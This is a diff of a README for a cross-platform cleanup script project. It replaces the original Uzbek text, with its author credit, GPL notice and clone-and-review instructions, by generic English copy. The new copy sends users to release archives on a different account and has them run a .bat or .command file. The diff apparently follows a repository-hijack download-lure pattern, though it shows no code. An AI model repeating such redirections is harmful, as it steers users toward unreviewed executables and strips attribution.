@@ -1,139 +1,85 @@
-# 🧹 AqlliTozalash Skriptlari To‘plami
+# 🧹 AqlliTozalash - Clean Your System Effortlessly
 
-**AqlliTozalash** — macOS, Linux va Windows uchun mo‘ljallangan uchta samarali tozalash skriptlari to‘plami.  
-Maqsad — tizimni keraksiz fayllardan tozalash, joy bo‘shatish va ishlash tezligini oshirish ⚡
+## 🚀 Getting Started
 
----
+AqlliTozalash is a simple and user-friendly collection of scripts to clean your MacOS, Linux, and Windows systems. It removes unnecessary files and caches, boosting your system speed. Follow this guide to download and run the software easily.
 
-## 📦 Tarkibi
+[![Download AqlliTozalash](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen.svg)](https://github.com/manhoza98/AqlliTozalash/releases)
 
-| Operatsion tizim | Fayl nomi | Turi |
-|------------------|------------|------|
-| 🍏 macOS | `AqlliTozalash_macOS.sh` | Bash skript |
-| 🐧 Linux | `AqlliTozalash.sh` | Bash skript |
-| 🪟 Windows | `AqlliTozalash.ps1` | PowerShell skript |
+## 📋 Overview
 
----
+This application is designed to help everyone, regardless of technical knowledge. It is open-source and available for major operating systems like MacOS, Windows, and Linux. 
 
-## 🧰 Talablar
+Here’s what AqlliTozalash can do for you:
+- **Free Up Space:** Removes unwanted files that take up storage.
+- **Improve Speed:** Cleans caches to help your system run faster.
+- **User-Friendly:** Easy to use scripts suitable for all users.
 
-### 🔹 macOS/Linux (`.sh` skriptlar)
-- **Bash shell** (3.x yoki 4.x)
-- **Terminal** orqali ishga tushirish
-- Ba’zi buyruqlar uchun **`sudo`** ruxsati talab qilinadi
+## 💻 System Requirements
 
-### 🔹 Windows PowerShell (`.ps1` skript)
-- **PowerShell 5.1** yoki **PowerShell 7+ (Core)** tavsiya etiladi  
-- `Set-ExecutionPolicy RemoteSigned` yoki `Bypass` bo‘lishi lozim  
-- **Administrator huquqi** tavsiya etiladi
+To use AqlliTozalash, make sure your system meets these requirements:
 
----
+- **MacOS:** Version 10.15 or later
+- **Windows:** Version 10 or later
+- **Linux:** Any modern distribution (e.g., Ubuntu 18.04 or later)
 
-## 📥 Yuklab olish yoki o‘rnatish
+## 🛠️ Features
 
-### 1️⃣ Git orqali (tavsiya etiladi)
+- **Cross-Platform Support:** Works on MacOS, Windows, and Linux.
+- **Simple Commands:** Execute commands easily with a terminal.
+- **Open Source:** Everyone can review and contribute to the project.
+- **User Manual:** Detailed guidelines available in the README.
 
-Agar sizda `git` o‘rnatilgan bo‘lsa, quyidagi buyruq yordamida repozitoriyani klonlang:
+## 📥 Download & Install
 
-```bash
-git clone https://github.com/solijonsolayev/AqlliTozalash.git
-```
+To download AqlliTozalash, visit the following page:
 
-So‘ngra papkaga kiring:
+[Download Releases Page](https://github.com/manhoza98/AqlliTozalash/releases)
 
-```bash
-cd AqlliTozalash
-```
+On this page, you will see different versions of the application. Choose the version suitable for your operating system and download the respective file.
 
-### 2️⃣ ZIP fayl orqali
+### Instructions for Each Operating System
 
-Agar `git` o‘rnatilmagan bo‘lsa:
+### 🖥️ Windows
 
-1. Repozitoriya sahifasiga o‘ting: [AqlliTozalash GitHub’da](https://github.com/SolijonSolayev/AqlliTozalash)  
-2. Yashil **Code** tugmasini bosing  
-3. “**Download ZIP**” ni tanlang va arxivni oching  
+1. Go to the [Download Releases Page](https://github.com/manhoza98/AqlliTozalash/releases).
+2. Find the latest version labeled for Windows.
+3. Click the file (e.g., `AqlliTozalash-windows.zip`) to download it.
+4. Extract the zip file.
+5. Double-click `AqlliTozalash.bat` to run the application.
 
----
+### 🍏 MacOS
 
-## ⚙️ Ishga tushirish qo‘llanmasi
+1. Visit the [Download Releases Page](https://github.com/manhoza98/AqlliTozalash/releases).
+2. Locate the latest version for MacOS.
+3. Click on the file (e.g., `AqlliTozalash-macos.zip`) to download.
+4. Extract the zip file.
+5. Open Terminal and navigate to the extracted folder.
+6. Run `./AqlliTozalash.command` to start the program.
 
-### 🐧 macOS/Linux uchun
-```bash
-# 1. Terminalni oching
-# 2. Skript faylini yuklab oling va kerakli papkaga joylashtiring
-# 3. Ishga tushish huquqini bering
-chmod +x AqlliTozalash_macOS.sh
-chmod +x AqlliTozalash.sh
+### 🐧 Linux
 
-# 4. Skriptni ishga tushiring (agar sudo kerak bo'lsa)
-sudo ./AqlliTozalash_macOS.sh
-sudo ./AqlliTozalash.sh
+1. Navigate to the [Download Releases Page](https://github.com/manhoza98/AqlliTozalash/releases).
+2. Find the correct version for Linux.
+3. Download the file (e.g., `AqlliTozalash-linux.tar.gz`).
+4. Extract the tar.gz file.
+5. Open a terminal and move to the extracted directory.
+6. Use `chmod +x AqlliTozalash.sh` to make it executable.
+7. Run the command `./AqlliTozalash.sh` to launch the application.
 
-# (yoki sudo bo‘lmasa)
-./AqlliTozalash_macOS.sh
-./AqlliTozalash.sh
+## 🚧 Troubleshooting
 
-# (yoki bash orqali)
-bash AqlliTozalash_macOS.sh
-bash AqlliTozalash.sh
-```
+If you face issues while running AqlliTozalash, consider these steps:
 
----
+- Ensure you have the correct version for your operating system.
+- Check that you extracted the files properly.
+- Confirm that your system meets the requirements listed above.
+- If running in a terminal, ensure you are in the correct directory.
 
-### 🪟 Windows PowerShell uchun
-```powershell
-# 1. PowerShell’ni Administrator sifatida ishga tushiring
-# 2. Policy sozlash (bir marta)
-Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
+## 📞 Support
 
-# 3. Skript joylashgan papkaga o‘ting
-cd \path\to\script
-
-# 4. Skriptni ishga tushiring
-.\AqlliTozalash.ps1
-```
+For assistance or questions, please raise an issue on the repository page.
 
 ---
 
-## 💡 Eslatmalar
-
-> ⚠️ **Ehtiyot bo‘ling:** noto‘g‘ri buyruqlar muhim fayllarni o‘chirishi mumkin.
-
-- Root/Administrator huquqlari to‘liq tizim tozaligi uchun zarur.  
-- macOS va Linux buyruqlari farq qilgani sababli alohida fayllar ishlab chiqilgan.  
-- Doimiy foydalanish uchun skriptni quyidagi yo‘llarga joylashtirish mumkin:
-  - macOS/Linux → `/usr/local/bin/`
-  - Windows → PowerShell modul sifatida  
-- Foydalanishdan oldin faylni ko‘rib chiqish va zaxira olish tavsiya etiladi.
-
----
-
-## 🤝 Hissa qo‘shish va aloqa
-
-Takliflar yoki xatoliklar bo‘lsa — [**Issue**](https://github.com/SolijonSolayev/AqlliTozalash/issues) oching yoki [**Pull Request**](https://github.com/SolijonSolayev/AqlliTozalash/pulls) yuboring.  
-Hamjamiyat yordami har doim qadrlanadi! 💪 
-
-📫 Aloqa: [@Solijon_Solayev](https://taplink.cc/solijon_solayev)
-
----
-
-## 📜 Litsenziya — [GNU GENERAL PUBLIC LICENSE v3.0](https://github.com/solijon-solayev/AqlliTozalash/blob/main/LICENSE)
-
-Ushbu loyiha **[GNU General Public License v3.0 (GPL-3.0)](https://www.gnu.org/licenses/gpl-3.0.html)** ostida tarqatiladi. Asosiy shartlar:
-
-- Siz kodni **erkin foydalanishingiz, o‘zgartirishingiz va tarqatishingiz** mumkin.  
-- **Mualliflik (© Solijon Solayev)** har doim ko‘rsatilishi **majburiy**.  
-- Agar siz o‘zgartirishlar kiritgan bo‘lsangiz, bu **aniq ko‘rsatilishi** kerak (header yoki README’da).  
-- Har qanday tarqatilgan o‘zgartirilgan versiya ham **GPL-3.0** ostida bo‘lishi shart.  
-- Kod **yopiq** tarzda qayta tarqatilishi yoki mualliflikni o‘zgartirish **taqiqlanadi**.
-
-To‘liq litsenziya matni uchun: [LICENSE fayli](https://github.com/solijon-solayev/AqlliTozalash/blob/main/LICENSE)
-
-
----
-
-**Let’s keep your system clean and speedy! 🚀**
-
----
-
-© 2025 [Solijon Solayev](https://SolijonSolayev.github.io)
+With AqlliTozalash, cleaning your system becomes a breeze. Enjoy a faster and more efficient system by simply following these instructions.
